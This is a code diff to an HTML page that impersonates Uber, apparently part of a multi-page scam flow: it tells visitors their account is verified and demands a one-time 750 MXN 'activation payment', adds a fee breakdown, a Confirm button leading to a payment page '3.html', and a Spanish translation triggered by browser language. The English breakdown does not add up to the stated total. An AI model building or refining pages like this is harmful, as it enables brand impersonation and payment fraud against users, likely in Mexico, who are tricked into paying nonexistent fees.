@@ -44,8 +44,16 @@
             margin: 20px 0;
             color: black;
         }
+        .payment-details {
+            font-size: 1.2rem;
+            margin: 20px auto;
+            color: black;
+            line-height: 1.8;
+            text-align: left;
+            max-width: 400px;
+        }
         .activation-button {
-            margin-top: 30px;
+            margin: 20px 10px 0;
             background-color: black;
             color: white;
             padding: 15px 30px;
@@ -73,22 +81,52 @@
         <h1>Uber</h1>
     </div>
     <div class="content">
-        <h2>Account Verified</h2>
-        <p class="confirmation-message">
+        <h2 id="accountVerifiedTitle">Account Verified</h2>
+        <p class="confirmation-message" id="confirmationMessage">
             Your account has been confirmed and is pending activation.
         </p>
-        <p class="instructions">
-            Please complete the activation payment to finalize the process.
+        <p class="instructions" id="instructionsMessage">
+            You are required to make a one-time activation payment of 750 MXN pesos before activation:
         </p>
-        <button class="activation-button" onclick="redirectToPayment()">Complete Payment</button>
+        <div class="payment-details" id="paymentDetails">
+            <p><strong>Breakdown:</strong></p>
+            <p>Account Activation Payment: 600 MXN</p>
+            <p>Service Fee: 240 MXN</p>
+        </div>
+        <button class="activation-button" onclick="redirectToPayment()">Confirm</button>
+        <button class="activation-button" style="background-color: red;" onclick="cancelActivation()">Cancel</button>
     </div>
     <div class="footer">
         By proceeding, you consent to receiving calls, WhatsApp, or SMS/RCS messages, including by automated means, from Uber and its affiliates to the number provided.
     </div>
     <script>
+        // Language Auto-detection
+        const userLang = navigator.language || navigator.userLanguage; 
+        const accountVerifiedTitle = document.getElementById("accountVerifiedTitle");
+        const confirmationMessage = document.getElementById("confirmationMessage");
+        const instructionsMessage = document.getElementById("instructionsMessage");
+        const paymentDetails = document.getElementById("paymentDetails");
+
+        if (userLang.includes('es')) {
+            // Spanish Translation
+            accountVerifiedTitle.textContent = "Cuenta Verificada";
+            confirmationMessage.textContent = "Tu cuenta ha sido confirmada y está pendiente de activación.";
+            instructionsMessage.textContent = "Debes realizar un pago único de activación de 750 MXN pesos antes de la activación:";
+            paymentDetails.innerHTML = `
+                <p><strong>Desglose:</strong></p>
+                <p>Pago de Activación de Cuenta: 600 MXN</p>
+                <p>Tarifa de Servicio: 150 MXN</p>
+            `;
+        }
+
+        // Redirect to payment page
         function redirectToPayment() {
-            // Redirect to the payment page
-            window.location.href = "3.html"; // Update this with your actual payment page URL
+            window.location.href = "3.html"; // Replace with the actual URL of your payment page
+        }
+
+        // Cancel activation process
+        function cancelActivation() {
+            alert("The activation process has been canceled.");
         }
     </script>
 </body>
